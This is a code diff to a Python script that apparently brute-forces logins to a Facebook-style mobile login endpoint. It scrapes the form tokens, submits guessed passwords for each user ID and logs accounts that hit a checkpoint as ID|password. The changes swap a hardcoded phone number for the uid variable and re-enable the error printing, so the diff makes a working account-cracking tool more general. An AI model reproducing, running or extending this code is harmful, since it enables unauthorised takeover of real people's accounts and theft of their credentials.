@@ -176,7 +176,7 @@ def crack(uid, password_list, total_count):
             'locale': 'bn_IN',
             'wd': '1143x773',
             }
-            log_data = {
+            data = {
             'jazoest': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1),
             'lsd': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1),
             'initial_request_id': 'A10tPfatOkwvT0WG7gWVNnY',
@@ -184,7 +184,7 @@ def crack(uid, password_list, total_count):
             'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjozMn0=',
             'lgnrnd': '214622_uurZ',
             'lgnjs': 'n',
-            'email': '9641097628',
+            'email': uid,
             'pass':  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'default_persistent': '',
             }
@@ -240,23 +240,23 @@ def crack(uid, password_list, total_count):
                 cps.append(uid+"|"+pw)
                 continue
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
+                print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
         loop += 1
     except requests.exceptions.Timeout:
-        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
     except requests.exceptions.ConnectionError:
         time.sleep(5)
         return False
     except requests.exceptions.RequestException as e:
-        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
         print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
